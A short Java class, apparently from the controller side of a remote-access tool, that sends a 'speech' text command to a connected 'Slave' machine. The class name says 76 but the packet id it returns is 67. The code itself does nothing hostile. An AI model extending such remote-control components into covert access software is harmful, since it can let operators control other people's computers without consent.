package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet76Speech extends AbstractOutgoingPacket {

	private String text;

	public Packet76Speech(String text) {
		this.text = text;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(text);
	}

	@Override
	public byte getPacketId() {
		return 67;
	}

}
